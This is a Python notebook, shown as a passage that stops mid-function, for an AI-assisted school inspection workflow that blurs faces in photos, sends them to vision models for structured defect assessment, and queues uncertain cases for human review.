# SchoolReview AI: Simplified Consolidation Notebook

This notebook keeps the image-level LangGraph workflow, simplifies unused state, writes compact category summaries, and prepares a small final LLM payload for school-level reporting.

## How To Run

Run cells from top to bottom. The model execution cell still makes live provider calls and writes outputs under `school_validation_outputs/`. The final aggregation preparation cells only read saved category JSON and do not call the final LLM yet.

## Initial Setup And General Helpers

These cells import dependencies, load environment variables, initialize model clients, and define small local helpers.

In [ ]:

from __future__ import annotations

import asyncio
import base64
import json
import os
import time
import warnings
from datetime import datetime, timezone
from pathlib import Path
from typing import Literal, TypedDict

import cv2
import numpy as np
from dotenv import load_dotenv                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
from google import genai
from google.genai import types
from jinja2 import BaseLoader, Environment, select_autoescape
from langchain_core.tracers.langchain import wait_for_all_tracers
from langgraph.graph import END, START, StateGraph
from langsmith import tracing_context, wrappers as langsmith_wrappers
from langsmith.wrappers import wrap_openai
from openai import OpenAI
from pydantic import BaseModel, Field
from pypdf import PdfReader


In [2]:

load_dotenv(dotenv_path=Path(".env"), override=True)

GEMINI_API_KEY = os.environ["GEMINI_API_KEY"]
OPENAI_API_KEY = os.environ["OPENAI_API_KEY"]
LANGSMITH_PROJECT = os.getenv("LANGSMITH_PROJECT", "schoolreview-ai")

gemini_client = langsmith_wrappers.wrap_gemini(genai.Client(api_key=GEMINI_API_KEY))
openai_client = wrap_openai(OpenAI(api_key=OPENAI_API_KEY))

PRIMARY_VLM_MODEL = "gemini-3.1-flash-lite"
BACKUP_VLM_MODEL = "gpt-4.1-mini"
ESCALATION_REVIEW_MODEL = "gpt-4.1-mini"
FINAL_AGGREGATION_MODEL = "gpt-4.1-mini"

MAX_GEMINI_ATTEMPTS = 3
REQUEST_DELAY_SECONDS = 5
MAX_CONCURRENT_REQUESTS = 1
CONFIDENCE_THRESHOLD = 0.60


C:\Users\surhi\AppData\Local\Temp\ipykernel_34692\1577736657.py:10: LangSmithBetaWarning: Function wrap_gemini is in beta.
  gemini_client = langsmith_wrappers.wrap_gemini(genai.Client(api_key=GEMINI_API_KEY))


In [3]:

FACE_CASCADE_PATH = Path(cv2.data.haarcascades) / "haarcascade_frontalface_default.xml"
EYE_CASCADE_PATH = Path(cv2.data.haarcascades) / "haarcascade_eye.xml"

face_cascade = cv2.CascadeClassifier(str(FACE_CASCADE_PATH))
eye_cascade = cv2.CascadeClassifier(str(EYE_CASCADE_PATH))


def read_text_if_exists(path: Path) -> str:
    """Read a text file when present, otherwise return an empty string."""

    if not path.exists():
        return ""
    return path.read_text(encoding="utf-8").strip()


def blur_region(image: np.ndarray, x: int, y: int, width: int, height: int) -> None:
    """Blur a detected region in-place."""

    region = image[y : y + height, x : x + width]
    if region.size == 0:
        return

    kernel_width = max(25, (width // 3) | 1)
    kernel_height = max(25, (height // 3) | 1)
    image[y : y + height, x : x + width] = cv2.GaussianBlur(region, (kernel_width, kernel_height), 0)


def blur_faces_in_image(input_path: Path, output_path: Path) -> Path:
    """Detect likely faces/eyes, blur them, and save the privacy image."""

    image = cv2.imread(str(input_path))
    if image is None:
        raise ValueError(f"Unable to read image: {input_path}")

    gray_image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    faces = face_cascade.detectMultiScale(gray_image, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))

    for (x, y, width, height) in faces:
        blur_region(image, x, y, width, height)

    eyes = eye_cascade.detectMultiScale(gray_image, scaleFactor=1.1, minNeighbors=10, minSize=(12, 12))
    for (x, y, width, height) in eyes:
        expanded_x = max(0, x - width // 2)
        expanded_y = max(0, y - height // 2)
        expanded_width = min(image.shape[1] - expanded_x, width * 2)
        expanded_height = min(image.shape[0] - expanded_y, height * 2)
        blur_region(image, expanded_x, expanded_y, expanded_width, expanded_height)

    output_path.parent.mkdir(parents=True, exist_ok=True)
    cv2.imwrite(str(output_path), image)
    return output_path


## Schemas And Minimal State

These cells define controlled labels, model output schemas, and only the state fields used by the current workflow.

In [4]:

Visibility = Literal["visible", "not_visible", "unclear"]
Severity = Literal["none", "low", "medium", "high", "unclear"]
OfficerCommentStatus = Literal["present", "missing", "unrelated", "contradictory", "unclear"]
OfficerAgreement = Literal["supports_visual_evidence", "contradicts_visual_evidence", "unrelated", "no_comment", "unclear"]
ActionType = Literal["none", "monitor", "maintenance_review", "urgent_attention", "documentation_follow_up", "human_review"]
CategoryStatus = Literal[
    "acceptable_visible_condition",
    "minor_maintenance",
    "attention_required",
    "urgent_review",
    "insufficient_evidence",
]
HumanReviewStatus = Literal["not_required", "pending"]
AssessmentSource = Literal["primary_model", "backup_model", "review_model"]
ImageJobStatus = Literal["pending", "completed", "failed"]
OverallInspectionStatus = Literal[
    "acceptable_with_minor_issues",
    "maintenance_attention_required",
    "urgent_review_required",
    "insufficient_evidence",
]


In [5]:

class VisualFinding(BaseModel):
    """One visible issue or uncertainty found in an image."""

    issue_type: str = Field(max_length=80)
    visibility: Visibility
    severity: Severity
    evidence: str = Field(max_length=260)
    confidence: float = Field(ge=0, le=1)


class RiskAssessment(BaseModel):
    """Overall image-level risk after reviewing visible evidence."""

    severity: Severity
    requires_human_review: bool
    reason: str = Field(max_length=260)


class OfficerCommentAssessment(BaseModel):
    """How the raw officer comment relates to the visible image evidence."""

    text: str = Field(max_length=500)
    status: OfficerCommentStatus
    agreement: OfficerAgreement
    reason: str = Field(max_length=260)
    documentation_gap: bool


class RecommendedAction(BaseModel):
    """Simple next step based on visible evidence and uncertainty."""

    action_type: ActionType
    action_text: str = Field(max_length=260)


class ImageAssessment(BaseModel):
    """Complete structured output for one inspection image."""

    image_name: str
    category: str
    visual_findings: list[VisualFinding]
    risk_assessment: RiskAssessment
    officer_comment_assessment: OfficerCommentAssessment
    recommended_action: RecommendedAction
    uncertainties: list[str]


class CategoryFinalFeedback(BaseModel):
    """Final report feedback for one inspection category."""

    category: str
    status: CategoryStatus
    priority: Literal["low", "medium", "high", "urgent"]
    short_summary: str = Field(max_length=700)
    main_concerns: list[str]
    recommended_next_steps: list[str]
    evidence_refs: list[str]


class FinalInspectionLLMReport(BaseModel):
    """Structured output expected from the final aggregation LLM."""

    overall_status: OverallInspectionStatus
    provisional: bool
    executive_summary: str = Field(max_length=1200)
    key_risks: list[str]
    category_feedback: list[CategoryFinalFeedback]
    immediate_actions: list[str]
    maintenance_actions: list[str]
    documentation_followups: list[str]
    human_review_notes: list[str]
    limitations: list[str]


In [6]:

class CategoryPaths(TypedDict):
    """Folder/file paths needed for one category run."""

    images_path: Path
    comments_path: Path
    overall_comment_path: Path
    privacy_images_path: Path
    model_output_path: Path


class JobError(TypedDict, total=False):
    """Short error details saved when one image job fails."""

    error_type: str
    error_message: str


class HumanReviewItem(TypedDict, total=False):
    """One image-level item that should be checked after category processing."""

    review_id: str
    category_name: str
    image_id: str
    raw_image_path: str
    reason: str
    model_assessment: dict
    status: HumanReviewStatus


class ImageAssessmentState(TypedDict, total=False):
    """State for assessing one inspection image."""

    category_name: str
    raw_image_path: Path
    privacy_image_path: Path
    officer_comment: str
    system_prompt: str

    primary_assessment: ImageAssessment | None
    backup_assessment: ImageAssessment | None
    review_assessment: ImageAssessment | None
    final_assessment: ImageAssessment | None

    primary_error: str | None
    review_error: str | None
    backup_used: bool
    review_used: bool
    final_assessment_source: AssessmentSource | None

    status: ImageJobStatus
    error: JobError | None

    human_review_required: bool
    human_review_status: HumanReviewStatus
    human_review_item: HumanReviewItem | None
    human_review_notes: str


class CategoryRunState(TypedDict, total=False):
    """State for running all image assessments inside one category."""

    category_name: str
    category_paths: CategoryPaths
    overall_comment: str
    system_prompt: str
    image_jobs: list[ImageAssessmentState]
    image_results: list[dict]
    human_review_queue: list[HumanReviewItem]
    category_summary: dict | None
    category_status: CategoryStatus | None
    human_review_required: bool
    saved_category_output_file: Path | None


class FullInspectionRunState(TypedDict, total=False):
    """State for the full run across selected categories."""

    run_category_names: list[str]
    category_states: dict[str, CategoryRunState]
    all_human_review_queue: list[HumanReviewItem]
    saved_category_output_files: dict[str, Path]


In [7]:

def init_image_state(
    category_name: str,
    raw_image_path: Path,
    privacy_image_path: Path,
    officer_comment: str,
    system_prompt: str,
) -> ImageAssessmentState:
    """Create the starting state for one image assessment graph run."""

    return {
        "category_name": category_name,
        "raw_image_path": raw_image_path,
        "privacy_image_path": privacy_image_path,
        "officer_comment": officer_comment,
        "system_prompt": system_prompt,
        "primary_assessment": None,
        "backup_assessment": None,
        "review_assessment": None,
        "final_assessment": None,
        "primary_error": None,
        "review_error": None,
        "backup_used": False,
        "review_used": False,
        "final_assessment_source": None,
        "status": "pending",
        "error": None,
        "human_review_required": False,
        "human_review_status": "not_required",
        "human_review_item": None,
        "human_review_notes": "",
    }


def init_category_state(
    category_name: str,
    category_paths: CategoryPaths,
    overall_comment: str,
    system_prompt: str,
) -> CategoryRunState:
    """Create the starting state for one category run."""

    return {
        "category_name": category_name,
        "category_paths": category_paths,
        "overall_comment": overall_comment,
        "system_prompt": system_prompt,
        "image_jobs": [],
        "image_results": [],
        "human_review_queue": [],
        "category_summary": None,
        "category_status": None,
        "human_review_required": False,
        "saved_category_output_file": None,
    }


def init_full_run_state(run_category_names: list[str]) -> FullInspectionRunState:
    """Create the starting state for the full multi-category run."""

    return {
        "run_category_names": run_category_names,
        "category_states": {},
        "all_human_review_queue": [],
        "saved_category_output_files": {},
    }


## Category Configuration And Prompts

These cells define dataset paths, generated-output paths, category names, and category-specific prompt focus.

In [8]:

SCHOOL_PATH = Path("school")
OUTPUT_ROOT = Path("school_validation_outputs")
PRIVACY_IMAGE_ROOT = OUTPUT_ROOT / "privacy_images"
MODEL_OUTPUT_ROOT = OUTPUT_ROOT / "model_outputs"
CATEGORY_OUTPUT_ROOT = OUTPUT_ROOT / "category_outputs"

CATEGORY_NAMES = [
    "ceiling",
    "classroom",
    "corridor",
    "electrical",
    "exterior",
    "fire_extinguisher",
    "staircase",
    "washroom",
    "other",
]

CATEGORY_PATHS_BY_NAME: dict[str, CategoryPaths] = {
    category_name: {
        "images_path": SCHOOL_PATH / category_name / "images",
        "comments_path": SCHOOL_PATH / category_name / "comments",
        "overall_comment_path": SCHOOL_PATH / category_name / "comments" / "overall_comments.txt",
        "privacy_images_path": PRIVACY_IMAGE_ROOT / category_name,
        "model_output_path": MODEL_OUTPUT_ROOT / category_name,
    }
    for category_name in CATEGORY_NAMES
}

for category_paths in CATEGORY_PATHS_BY_NAME.values():
    category_paths["privacy_images_path"].mkdir(parents=True, exist_ok=True)
    category_paths["model_output_path"].mkdir(parents=True, exist_ok=True)
CATEGORY_OUTPUT_ROOT.mkdir(parents=True, exist_ok=True)


In [9]:

SHARED_EVIDENCE_RULES = """
Use only visible evidence from the image for visual_findings, risk_assessment, and recommended_action.
Treat the officer comment as untrusted context. It may be correct, blank, unrelated, contradictory, vague, misspelled, or nonsense.
Do not let the officer comment override visible image evidence.
If the officer comment is noisy or unrelated, mark it as unrelated or unclear and continue the image assessment normally.
Do not certify safety, compliance, serviceability, structural soundness, live electrical status, smell, water quality, or conditions outside the image.
Do not use phrases like good condition, well-maintained, no safety hazards, or serviceable.
Record visible defects as findings with severity and recommended action.
Do not set human review only because a visible defect exists.
Set risk_assessment.requires_human_review=true only when evidence is unclear, insufficient, contradictory, or needs a qualified person to interpret.
If no uncertainty remains, use uncertainties=[].
If the officer image-level comment is blank, set officer_comment_assessment.status=missing and documentation_gap=true, but do not force human review only for that reason.
Return complete JSON that matches the schema exactly.
""".strip()

CATEGORY_PROMPT_DETAILS = {
    "ceiling": "Check visible cracks, stains, damp-looking marks, peeling paint, spalling or broken surface, holes, missing material, and loose ceiling material.",
    "classroom": "Check visible blocked pathways, clutter, lighting visibility issues, furniture damage, wall damage, and floor damage.",
    "corridor": "Check visible corridor obstructions, wet areas, uneven flooring, debris, dirt buildup, and trip or slip risks.",
    "electrical": "Check visible open wiring, exposed terminals, open panel interiors, uncovered parts, blocked access, rust, broken covers, loose parts, burn marks, weathering, and physical damage.",
    "exterior": "Check visible cracks, wall separations, stains, damp-looking patches, peeling paint, spalling or broken surface, holes, missing material, and loose wall material.",
    "fire_extinguisher": "Check whether an extinguisher is visible, access is blocked, visible rust or corrosion exists, parts are damaged or missing, and whether the tag or gauge is readable.",
    "staircase": "Check visible blocked stairs or landings, railing damage, missing railing parts, poor visibility, broken steps, uneven surfaces, clutter, wet areas, and trip or slip risks.",
    "washroom": "Check visible dirt, staining, waste, fixture damage, wet floors, standing water, wall dampness or staining, and visible leakage.",
    "other": "Identify the main visible subject and any visible concern. Use no findings if no concern is visible.",
}

CATEGORY_SYSTEM_PROMPTS = {
    category_name: (
        f"You are reviewing {category_name} school inspection images.\n"
        f"{details}\n\n"
        f"{SHARED_EVIDENCE_RULES}"
    )
    for category_name, details in CATEGORY_PROMPT_DETAILS.items()
}


## Model Call And Output Helpers

These cells define provider calls, deterministic model-output cleanup, and JSON result conversion.

In [10]:

GEMINI_RATE_LIMIT_LOCK = asyncio.Lock()
LAST_GEMINI_REQUEST_TIME = 0.0


async def wait_for_gemini_request_slot():
    """Pause until the next Gemini request is allowed by the local delay."""

    global LAST_GEMINI_REQUEST_TIME

    async with GEMINI_RATE_LIMIT_LOCK:
        elapsed = time.monotonic() - LAST_GEMINI_REQUEST_TIME
        wait_seconds = max(0, REQUEST_DELAY_SECONDS - elapsed)
        if wait_seconds > 0:
            await asyncio.sleep(wait_seconds)
        LAST_GEMINI_REQUEST_TIME = time.monotonic()


def explain_gemini_error(error: Exception) -> str:
    """Convert common Gemini failures into short messages for logs and JSON."""

    error_text = str(error)
    if "429" in error_text or "RESOURCE_EXHAUSTED" in error_text:
        return "Gemini quota or rate limit was hit."
    if "503" in error_text or "UNAVAILABLE" in error_text:
        return "Gemini model is temporarily unavailable or under high demand."
    if "timeout" in error_text.lower():
        return "Gemini request timed out."
    if "500" in error_text:
        return "Gemini returned a temporary server error."
    return "Gemini request failed."


def should_retry_gemini_error(error: Exception) -> bool:
    """Retry only temporary-looking Gemini failures."""

    error_text = str(error).lower()
    retry_markers = ["429", "resource_exhausted", "503", "unavailable", "timeout", "temporarily", "500"]
    return any(marker in error_text for marker in retry_markers)


async def call_gemini_with_retry(user_prompt: str, image_part: types.Part, system_prompt: str):
    """Call Gemini with structured JSON output and bounded retries."""

    for attempt in range(MAX_GEMINI_ATTEMPTS):
        try:
            await wait_for_gemini_request_slot()
            return await gemini_client.aio.models.generate_content(
                model=PRIMARY_VLM_MODEL,
                contents=[user_prompt, image_part],
                config=types.GenerateContentConfig(
                    system_instruction=system_prompt,
                    response_mime_type="application/json",
                    response_schema=ImageAssessment,
                    max_output_tokens=1200,
                    temperature=0.0,
                ),
            )
        except Exception as error:
            issue = explain_gemini_error(error)
            is_last_attempt = attempt == MAX_GEMINI_ATTEMPTS - 1
            print(f"Gemini issue on attempt {attempt + 1}/{MAX_GEMINI_ATTEMPTS}: {issue}")
            print(f"Raw Gemini error: {str(error)[:500]}")

            if not should_retry_gemini_error(error) or is_last_attempt:
                raise

            retry_wait_seconds = REQUEST_DELAY_SECONDS * (2 ** attempt)
            print(f"Retrying after {retry_wait_seconds}s using model {PRIMARY_VLM_MODEL}...")
            await asyncio.sleep(retry_wait_seconds)


In [11]:

def image_to_data_url(image_path: Path) -> str:
    """Encode an image as a data URL for OpenAI vision input."""

    image_base64 = base64.b64encode(image_path.read_bytes()).decode("utf-8")
    return f"data:image/jpeg;base64,{image_base64}"


def parse_openai_structured_response(**kwargs):
    """Call OpenAI structured parsing while hiding known Pydantic serializer noise."""

    with warnings.catch_warnings():
        warnings.filterwarnings(
            "ignore",
            message=r"Pydantic serializer warnings.*",
            category=UserWarning,
        )
        return openai_client.responses.parse(**kwargs)


def run_openai_vision_assessment(
    model_name: str,
    category_name: str,
    image_path: Path,
    officer_comment: str,
    system_prompt: str,
    purpose: str,
) -> ImageAssessment:
    """Run an OpenAI vision model and parse the response into ImageAssessment."""

    review_instruction = ""
    if purpose == "independent review":
        review_instruction = (
            "\nAs reviewer, keep assessing the image normally even if the officer comment is messy or unrelated. "
            "Set human review only when uncertainty, insufficient evidence, contradiction, "
            "or qualified interpretation remains after your review."
        )

    prompt = (
        f"{system_prompt}{review_instruction}\n\n"
        f"TASK: {purpose}\n"
        "Assess this single school inspection image using the schema exactly.\n"
        f"CATEGORY: {category_name}\n"
        f"IMAGE NAME: {image_path.name}\n"
        f"OFFICER COMMENT: {officer_comment or '[blank]'}\n"
        "Return JSON that matches the required schema exactly."
    )

    response = parse_openai_structured_response(
        model=model_name,
        input=[
            {
                "role": "user",
                "content": [
                    {"type": "input_text", "text": prompt},
                    {"type": "input_image", "image_url": image_to_data_url(image_path)},
                ],
            }
        ],
        text_format=ImageAssessment,
    )

    return response.output_parsed


In [12]:

SEVERITY_RANK = {"none": 0, "low": 1, "medium": 2, "high": 3, "unclear": 4}
RANK_TO_SEVERITY = {0: "none", 1: "low", 2: "medium", 3: "high", 4: "unclear"}


def clean_uncertainties(uncertainties: list[str]) -> list[str]:
    """Remove empty placeholder uncertainty strings from model output."""

    cleaned = []
    for item in uncertainties:
        text = str(item).strip()
        if text and text.lower() not in {"none", "n/a", "na", "no uncertainty", "no uncertainties"}:
            cleaned.append(text)
    return cleaned


def normalize_assessment(assessment: ImageAssessment, image_name: str, category_name: str, officer_comment: str) -> ImageAssessment:
    """Apply structural cleanup after a model response is parsed."""

    assessment.image_name = image_name
    assessment.category = category_name
    assessment.officer_comment_assessment.text = officer_comment
    assessment.uncertainties = clean_uncertainties(assessment.uncertainties)
    return assessment


def max_visible_severity(assessment: ImageAssessment) -> Severity:
    """Find the highest severity among visible or unclear findings."""

    max_rank = SEVERITY_RANK["none"]
    for finding in assessment.visual_findings:
        if finding.visibility == "visible":
            max_rank = max(max_rank, SEVERITY_RANK[finding.severity])
        if finding.visibility == "unclear":
            max_rank = max(max_rank, SEVERITY_RANK["unclear"])
    return RANK_TO_SEVERITY[max_rank]


def apply_rule_based_risk_updates(assessment: ImageAssessment) -> ImageAssessment:
    """Keep image-level risk/action consistent with the strongest visible finding."""

    visible_severity = max_visible_severity(assessment)
    if SEVERITY_RANK[visible_severity] > SEVERITY_RANK[assessment.risk_assessment.severity]:
        assessment.risk_assessment.severity = visible_severity

    if visible_severity == "high" and assessment.recommended_action.action_type in ["none", "monitor"]:
        assessment.recommended_action.action_type = "urgent_attention"
        assessment.recommended_action.action_text = "Address the high-severity visible finding in the category summary."
    elif visible_severity == "medium" and assessment.recommended_action.action_type == "none":
        assessment.recommended_action.action_type = "maintenance_review"
        assessment.recommended_action.action_text = "Review the visible maintenance concern."
    elif visible_severity == "low" and assessment.recommended_action.action_type == "none":
        assessment.recommended_action.action_type = "monitor"
        assessment.recommended_action.action_text = "Monitor the minor visible concern."

    if assessment.uncertainties or assessment.risk_assessment.severity == "unclear":
        assessment.risk_assessment.requires_human_review = True

    return assessment


def finalize_model_assessment(
    assessment: ImageAssessment,
    image_name: str,
    category_name: str,
    officer_comment: str,
) -> ImageAssessment:
    """Normalize and apply deterministic risk rules to one model assessment."""

    assessment = normalize_assessment(assessment, image_name, category_name, officer_comment)
    return apply_rule_based_risk_updates(assessment)


def should_use_review_model(assessment: ImageAssessment) -> bool:
    """Decide whether the independent review model should review this image."""

    if assessment.risk_assessment.requires_human_review:
        return True
    if assessment.risk_assessment.severity in ["high", "unclear"]:
        return True
    if assessment.officer_comment_assessment.agreement in ["contradicts_visual_evidence", "unclear"]:
        return True
    return any(finding.visibility == "unclear" or finding.confidence < CONFIDENCE_THRESHOLD for finding in assessment.visual_findings)


In [13]:

def build_human_review_item(state: ImageAssessmentState, reason: str | None = None) -> HumanReviewItem:
    """Create one queued human-review item from a completed or failed image state."""

    final_assessment = state.get("final_assessment")
    image_id = state["raw_image_path"].name

    return {
        "review_id": f"{state['category_name']}::{image_id}",
        "category_name": state["category_name"],
        "image_id": image_id,
        "raw_image_path": str(state["raw_image_path"]),
        "reason": reason or (
            final_assessment.risk_assessment.reason
            if final_assessment
            else "Image assessment failed or is missing."
        ),
        "model_assessment": final_assessment.model_dump() if final_assessment else {},
        "status": "pending",
    }


def finalize_human_review_fields(state: ImageAssessmentState) -> dict:
    """Return human-review fields for a completed image state."""

    if state.get("human_review_required"):
        return {
            "human_review_required": True,
            "human_review_status": state.get("human_review_status", "pending"),
            "human_review_item": state.get("human_review_item") or build_human_review_item(state),
            "human_review_notes": state.get("human_review_notes", "Queued for human review after all category processing is complete."),
        }

    final_assessment = state.get("final_assessment")
    human_review_required = bool(final_assessment and final_assessment.risk_assessment.requires_human_review)

    if not human_review_required:
        return {
            "human_review_required": False,
            "human_review_status": "not_required",
            "human_review_item": None,
            "human_review_notes": "",
        }

    return {
        "human_review_required": True,
        "human_review_status": "pending",
        "human_review_item": build_human_review_item(state),
        "human_review_notes": "Queued for human review after all category processing is complete.",
    }


def image_state_to_result(state: ImageAssessmentState) -> dict:
    """Convert final image state into the saved image-level JSON shape."""

    raw_image_path = state["raw_image_path"]

    if state.get("status") == "failed":
        review_reason = "Image job failed and should be checked after category processing."
        return {
            "image_id": raw_image_path.name,
            "category": state["category_name"],
            "status": "failed",
            "raw_image_path": str(raw_image_path),
            "model_trace": {
                "primary_model": PRIMARY_VLM_MODEL,
                "backup_model": BACKUP_VLM_MODEL,
                "review_model": ESCALATION_REVIEW_MODEL,
                "final_assessment_source": None,
                "backup_used": state.get("backup_used"),
                "review_used": state.get("review_used"),
                "primary_error": state.get("primary_error"),
                "review_error": state.get("review_error"),
            },
            "primary_assessment": state["primary_assessment"].model_dump() if state.get("primary_assessment") else None,
            "backup_assessment": state["backup_assessment"].model_dump() if state.get("backup_assessment") else None,
            "review_assessment": state["review_assessment"].model_dump() if state.get("review_assessment") else None,
            "final_assessment": state["final_assessment"].model_dump() if state.get("final_assessment") else None,
            "human_review": {
                "required": True,
                "status": "pending",
                "item": build_human_review_item(state, review_reason),
                "notes": review_reason,
            },
            "error": state.get("error"),
        }

    return {
        "image_id": raw_image_path.name,
        "category": state["category_name"],
        "status": state["status"],
        "raw_image_path": str(raw_image_path),
        "model_trace": {
            "primary_model": PRIMARY_VLM_MODEL,
            "backup_model": BACKUP_VLM_MODEL if state.get("backup_used") else None,
            "review_model": ESCALATION_REVIEW_MODEL if state.get("review_used") else None,
            "final_assessment_source": state.get("final_assessment_source"),
            "backup_used": state.get("backup_used"),
            "review_used": state.get("review_used"),
            "primary_error": state.get("primary_error"),
            "review_error": state.get("review_error"),
        },
        "primary_assessment": state["primary_assessment"].model_dump() if state.get("primary_assessment") else None,
        "backup_assessment": state["backup_assessment"].model_dump() if state.get("backup_assessment") else None,
        "review_assessment": state["review_assessment"].model_dump() if state.get("review_assessment") else None,
        "final_assessment": state["final_assessment"].model_dump() if state.get("final_assessment") else None,
        "human_review": {
            "required": state.get("human_review_required", False),
            "status": state.get("human_review_status", "not_required"),
            "item": state.get("human_review_item"),
            "notes": state.get("human_review_notes", ""),
        },
        "error": state.get("error"),
    }


## LangGraph Image Workflow

These cells define and compile the reusable image-level graph.

In [14]:

async def privacy_preprocess_node(state: ImageAssessmentState) -> dict:
    """Create the privacy image before sending anything to a model."""

    blur_faces_in_image(state["raw_image_path"], state["privacy_image_path"])
    return {"privacy_image_path": state["privacy_image_path"]}


async def run_primary_model_node(state: ImageAssessmentState) -> dict:
    """Try the primary Gemini model first."""

    raw_image_path = state["raw_image_path"]
    privacy_image_path = state["privacy_image_path"]
    officer_comment = state["officer_comment"]

    user_prompt = (
        "Assess this single school inspection image using only visible evidence.\n"
        f"CATEGORY: {state['category_name']}\n"
        f"IMAGE NAME: {raw_image_path.name}\n"
        f"OFFICER COMMENT: {officer_comment or '[blank]'}"
    )

    image_part = types.Part.from_bytes(data=privacy_image_path.read_bytes(), mime_type="image/jpeg")

    try:
        response = await call_gemini_with_retry(user_prompt, image_part, state["system_prompt"])
        assessment = finalize_model_assessment(response.parsed, raw_image_path.name, state["category_name"], officer_comment)
        return {
            "primary_assessment": assessment,
            "final_assessment": assessment,
            "final_assessment_source": "primary_model",
            "primary_error": None,
        }
    except Exception as error:
        return {"primary_error": explain_gemini_error(error)}


def route_review(state: ImageAssessmentState) -> str:
    """Route to review model only when the current final assessment needs it."""

    if state.get("status") == "failed":
        return "finalize_image"
    if state.get("final_assessment") and should_use_review_model(state["final_assessment"]):
        return "run_review_model"
    return "finalize_image"


def route_after_primary(state: ImageAssessmentState) -> str:
    """Route to backup only when Gemini did not produce an assessment."""

    if state.get("final_assessment") is None:
        return "run_backup_model"
    return route_review(state)


async def run_backup_model_node(state: ImageAssessmentState) -> dict:
    """Use OpenAI backup model when Gemini fails."""

    try:
        assessment = run_openai_vision_assessment(
            BACKUP_VLM_MODEL,
            state["category_name"],
            state["privacy_image_path"],
            state["officer_comment"],
            state["system_prompt"],
            "backup availability review",
        )
        assessment = finalize_model_assessment(
            assessment,
            state["raw_image_path"].name,
            state["category_name"],
            state["officer_comment"],
        )
        return {
            "backup_assessment": assessment,
            "final_assessment": assessment,
            "final_assessment_source": "backup_model",
            "backup_used": True,
        }
    except Exception as error:
        return {
            "status": "failed",
            "error": {"error_type": type(error).__name__, "error_message": str(error)[:1000]},
            "backup_used": True,
        }


async def run_review_model_node(state: ImageAssessmentState) -> dict:
    """Use the review model when the first successful assessment needs deeper checking."""

    try:
        assessment = run_openai_vision_assessment(
            ESCALATION_REVIEW_MODEL,
            state["category_name"],
            state["privacy_image_path"],
            state["officer_comment"],
            state["system_prompt"],
            "independent review",
        )
        assessment = finalize_model_assessment(
            assessment,
            state["raw_image_path"].name,
            state["category_name"],
            state["officer_comment"],
        )
        return {
            "review_assessment": assessment,
            "final_assessment": assessment,
            "final_assessment_source": "review_model",
            "review_used": True,
            "review_error": None,
        }
    except Exception as error:
        review_reason = "Independent review failed; use the prior model assessment only as provisional."
        return {
            "review_error": str(error)[:1000],
            "review_used": True,
            "human_review_required": True,
            "human_review_status": "pending",
            "human_review_item": build_human_review_item(state, review_reason),
            "human_review_notes": review_reason,
        }


def finalize_image_node(state: ImageAssessmentState) -> dict:
    """Finish the image state and queue human review if needed."""

    if state.get("status") == "failed":
        return {}

    return {"status": "completed", **finalize_human_review_fields(state)}


In [15]:

def build_image_assessment_graph():
    """Compile the image-level LangGraph workflow."""

    graph = StateGraph(ImageAssessmentState)

    graph.add_node("privacy_preprocess", privacy_preprocess_node)
    graph.add_node("run_primary_model", run_primary_model_node)
    graph.add_node("run_backup_model", run_backup_model_node)
    graph.add_node("run_review_model", run_review_model_node)
    graph.add_node("finalize_image", finalize_image_node)

    graph.add_edge(START, "privacy_preprocess")
    graph.add_edge("privacy_preprocess", "run_primary_model")
    graph.add_conditional_edges("run_primary_model", route_after_primary)
    graph.add_conditional_edges("run_backup_model", route_review)
    graph.add_edge("run_review_model", "finalize_image")
    graph.add_edge("finalize_image", END)

    return graph.compile()


image_assessment_graph = build_image_assessment_graph()


## Category Summaries And Output Saving

These cells prepare category image states, summarize image-level results into compact category JSON, and save outputs.

In [16]:

def build_category_image_states(category_name: str, category_paths: CategoryPaths, system_prompt: str) -> list[ImageAssessmentState]:
    """Create one starting image state for each image in one category."""

    image_states = []
    image_paths = sorted(category_paths["images_path"].glob("*.jpg"))

    for raw_image_path in image_paths:
        privacy_image_path = category_paths["privacy_images_path"] / raw_image_path.name
        officer_comment = read_text_if_exists(category_paths["comments_path"] / f"{raw_image_path.stem}.txt")
        image_states.append(
            init_image_state(
                category_name,
                raw_image_path,
                privacy_image_path,
                officer_comment,
                system_prompt,
            )
        )

    return image_states


def classify_category(image_results: list[dict]) -> CategoryStatus:
    """Convert image-level risk severities into one category-level status."""

    if not image_results:
        return "insufficient_evidence"

    severities = []
    failed_result_seen = False

    for result in image_results:
        if result["status"] != "completed":
            failed_result_seen = True
            continue

        risk = result["final_assessment"]["risk_assessment"]
        severities.append(risk["severity"])

    if not severities:
        return "insufficient_evidence"
    if "high" in severities:
        return "urgent_review"
    if failed_result_seen or "unclear" in severities:
        return "insufficient_evidence"
    if "medium" in severities:
        return "attention_required"
    if "low" in severities:
        return "minor_maintenance"
    return "acceptable_visible_condition"


def summarize_category(category_name: str, category_results: list[dict], overall_comment: str) -> dict:
    """Create one compact category summary from all image-level results."""

    issue_counts = {"high": 0, "medium": 0, "low": 0}
    key_findings = []
    documentation_gaps = []
    recommended_actions = []
